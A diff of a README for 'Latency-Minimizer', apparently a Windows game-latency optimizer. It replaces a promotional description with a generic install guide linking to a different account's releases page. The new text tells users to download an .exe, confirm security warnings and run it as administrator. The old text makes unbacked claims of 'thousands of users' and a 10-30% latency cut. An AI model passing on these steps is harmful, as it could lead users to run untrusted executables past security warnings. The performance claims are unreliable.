@@ -1,67 +1,86 @@
-# Latency-Minimizer
-Latency Minimizer
-An intelligent system optimizer for eliminating input lag and achieving maximum responsiveness in games and applications.
+# 🎮 Latency-Minimizer - Improve Your Gaming Response Time
 
-Do you experience annoying “lag” when the action in the game occurs a moment after you click the mouse or press a key? Latency Minimizer is a professional open-source tool that analyzes and fine-tunes your Windows operating system to dramatically reduce the delay between your action and the response on the screen.
+[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/Komfuu0963/Latency-Minimizer/releases)
 
-We turn your computer into a perfectly tuned system for competitive gaming and real-time work.
+## 🚀 Getting Started
 
-How it works: a scientific approach to smoothness
-Latency Minimizer is not a magic “booster.” It is a comprehensive optimizer that works on several levels:
+Welcome to Latency-Minimizer! This tool helps you reduce lag in your games and applications, making your experience smoother and more enjoyable. Follow the steps below to download and run the software easily.
 
-Real-Time Process Tuning: The application temporarily raises the priority of critical processes (game, graphics driver, audio driver) to Realtime and lowers the priority of background tasks, minimizing interruptions.
+## 📦 Download & Install
 
-Windows Scheduler Optimization (CPU Scheduling): Adjusts system scheduler settings to reduce DPC (Deferred Procedure Calls) and ISR (Interrupt Service Routines) delays, which are a common cause of microfreezes and lag.
+1. **Visit the Releases Page**: Click the link below to go to the Releases page.
 
-Power and Core Parking Management: Disables the processor's power-saving features (such as core parking) and puts the system into maximum performance mode, ensuring stable CPU clock speeds.
+   [Download Latest Release](https://github.com/Komfuu0963/Latency-Minimizer/releases)
 
-Network Optimization (for online games) - Network Buffer Tuning: Adjusts network adapter buffer sizes and TCP/UDP settings to reduce network jitter and latency within the capabilities of your connection.
+2. **Choose Your Version**: On the Releases page, select the version that suits your operating system. Look for files that end with `.exe`.
 
-Automation of “manual” tweaks (One-Click Optimization): Performs a set of proven and safe registry and system settings optimizations that would take experienced users hours to configure manually.
+3. **Download the File**: Click on the link for the chosen file to start the download. Depending on your browser settings, the file may download to your "Downloads" folder or another specified location.
 
-Key Benefits
-Measurable Input Lag Reduction: Feel the difference, especially in first-person shooters (CS2, Valorant), fighting games, and racing simulators. Controls become sharp and predictable.
+4. **Run the Installer**: Once the file is downloaded, double-click it to start the installation process. If prompted, confirm any security warnings to proceed.
 
-Stutter Elimination: The system becomes smoother by minimizing background activity and interruptions.
+5. **Follow the Setup Instructions**: The installation wizard will guide you through the setup. Simply follow the on-screen instructions to complete the installation.
 
-Frame Pacing: Reduces dips and evens out frame rendering times, making the image subjectively smoother even with an unchanged average FPS.
+6. **Launch the Application**: After installation, locate Latency-Minimizer on your computer. You can usually find it in your Start menu or on your desktop. Double-click the icon to launch the application.
 
-Complete security and reversibility: All changes are made to the RAM or through the system's official APIs. Standard .reg files are created to apply permanent settings. Any change can be instantly reversed with a built-in revert script.
+## ⚙️ System Requirements
 
-Smart profiles: Create and switch between optimization profiles for different games and workloads, or revert to the stock Windows settings with a single click.
+To ensure Latency-Minimizer runs smoothly, make sure your computer meets the following requirements:
 
-Who is Latency Minimizer designed for?
-Esports athletes and competitive gamers, for whom every millisecond of latency can determine the outcome of a round.
+- **Operating System**: Windows 10 or later
+- **CPU**: Dual-core processor or better
+- **RAM**: 4 GB or more
+- **Disk Space**: At least 100 MB of free space
+- **Internet Connection**: Required for initial download
 
-Streamers and content creators who need a stable and responsive system for simultaneous gaming, recording, and broadcasting.
+## 🎯 Features
 
-Professionals in video editing, 3D rendering, and audio recording, where interface responsiveness is critical.
+Latency-Minimizer includes several features designed to optimize your system for speed and responsiveness:
 
-PC upgrade enthusiasts who want to squeeze the most performance out of their configuration using legal methods.
+- **Real-Time Process Tuning**: Increases the priority of important processes like games or graphics drivers to reduce lag.
+  
+- **Windows Scheduler Optimization**: Adjusts the system scheduler so your CPU can allocate resources more effectively.
 
-Critical information: transparency and security
-Latency Minimizer is a tool for legally optimizing your operating system within the limits permitted by Microsoft.
+- **User-Friendly Interface**: The app provides an easy-to-use interface, making optimization accessible for all users.
 
-It is NOT a cheat, hack, or game modification. The application does not interact with game processes, does not modify game files, and does not provide unfair advantages in multiplayer. It only improves the environment in which the game runs.
+- **Performance Monitoring Tools**: Track system performance and view the impact of optimizations in real-time.
 
-It works through documented Windows APIs and utilities: PowerShell, Windows Management Instrumentation (WMI), official command line utilities (powercfg, wpr).
+## 🔧 How It Works
 
-Complete code transparency: Every line of code is available for review. You can see exactly which system commands are being executed.
+Latency-Minimizer operates on a scientific basis to minimize delays on your computer. 
 
-Administrator rights required: Like any low-level system tweaker. Only run from trusted sources.
+1. The tool intelligently raises the priority of critical applications while lowering the priority of background tasks.
 
-Warning: Using any optimizers can, in rare cases, lead to system instability if the hardware or drivers are faulty. Always create a system restore point before experimenting.
+2. It optimizes how your Windows operating system handles process scheduling, ensuring your games receive the hardware resources they need quickly.
 
-Why does the community choose Latency Minimizer?
-Focus on the main problem: Not an abstract “FPS booster,” but a targeted fight against lag and delays.
+## 📖 Troubleshooting
 
-Professional level: Implements tweaks used by experienced overclockers and esports teams.
+If you experience issues while using Latency-Minimizer:
 
-Control and understanding: Each option is explained in detail. You know what you are changing in the system.
+- **Application Does Not Start**: Ensure your computer meets the system requirements. Try running the app as an administrator by right-clicking the icon and selecting "Run as administrator."
 
-Trust through open source code: No hidden miners, Trojans, or spyware. Just clean code for a single purpose.
+- **Unexpected Behavior**: Restart your computer and try launching the application again.
 
-It works: Thousands of users and tests on modern systems confirm a 10-30% reduction in latency in scenarios limited by system responsiveness.
+- **Lag Persists**: Check other background applications that may be using system resources and consider closing them.
 
-Take back control of your responsiveness. Make your system faster than ever.
-DOWNLOAD: https://github.com/archerferretdj0/Latency-Minimizer/releases/tag/Latency-Minimizer
+## 💬 Support
+
+For additional help or questions:
+
+1. Visit the [Issues page](https://github.com/Komfuu0963/Latency-Minimizer/issues) in this repository.
+2. Post a detailed description of your issue.
+
+## 🌐 Community & Contributions
+
+Latency-Minimizer is an open-source project. You’re welcome to contribute:
+
+- Report bugs or suggest features on the Issues page.
+- Fork the repository and submit pull requests for improvements.
+
+## 📅 Stay Updated
+
+To keep updated on new releases and features:
+
+- Follow the repository on GitHub.
+- Check back regularly on the [Releases page](https://github.com/Komfuu0963/Latency-Minimizer/releases).
+
+Thank you for using Latency-Minimizer! Enjoy a smoother, faster gaming experience.
